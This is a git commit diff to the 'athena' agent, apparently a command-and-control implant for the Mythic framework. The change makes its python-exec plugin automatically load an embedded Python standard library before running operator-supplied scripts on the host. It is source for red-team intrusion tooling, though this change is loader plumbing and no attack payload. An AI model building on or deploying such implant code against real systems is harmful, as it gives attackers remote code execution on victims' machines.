e1507fcf72d30c0f5aad8b95fef15da8c98dde60
checkymander <checkymander@protonmail.com>
2024-12-05 15:17:34 -0500

    made stdlib load happen automatically

--- Payload_Type/athena/athena/agent_code/python-exec/python-exec.cs
+++ Payload_Type/athena/athena/agent_code/python-exec/python-exec.cs
@@ -2,6 +2,9 @@
 using System.Text.Json;
 using Agent.Models;
 using Agent.Utilities;
+using System.Reflection;
+using IronPython.Modules;
+using static Community.CsharpSqlite.Sqlite3;
 
 namespace Agent
 {
@@ -10,6 +13,7 @@ namespace Agent
         public string Name => "python-exec";
         private IMessageManager messageManager { get; set; }
         private IPythonManager pythonManager { get; set; }
+        private bool stdLibLoaded { get; set; }
 
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
@@ -30,6 +34,24 @@ namespace Agent
                 });
                 return;
             }
+
+            if (!stdLibLoaded)
+            {
+                if (!LoadStdLib())
+                {
+                    messageManager.AddTaskResponse(new TaskResponse()
+                    {
+                        task_id = job.task.id,
+                        user_output = "Failed to initialize python development, stdlib is unavailable You can still try to run scripts, but you'll need to manually import required libraries with python-load.",
+                        completed = true
+                    });
+                    //Mark loaded as true to allow operator to still "try" to run python scripts although it likely won't work
+                    this.stdLibLoaded = true;
+                    return;
+                }
+                this.stdLibLoaded = true;
+            }
+
             byte[] scriptBytes = Misc.Base64DecodeToByteArray(pyArgs.file);
             string scriptContents = Misc.GetEncoding(scriptBytes).GetString(scriptBytes);
             string[] argv = Misc.SplitCommandLine(pyArgs.args);
@@ -40,6 +62,22 @@ namespace Agent
                 user_output = pythonManager.ExecuteScript(scriptContents, argv),
                 completed = true
             });
+        }
+
+        private bool LoadStdLib()
+        {
+            return pythonManager.LoadPyLib(GetStdLib());
+        }
+
+        private byte[] GetStdLib()
+        {
+            using (Stream resFilestream = Assembly.GetExecutingAssembly().GetManifestResourceStream("lib.zip"))
+            {
+                if (resFilestream == null) return null;
+                byte[] ba = new byte[resFilestream.Length];
+                resFilestream.Read(ba, 0, ba.Length);
+                return ba;
+            }
         }
     }
 }
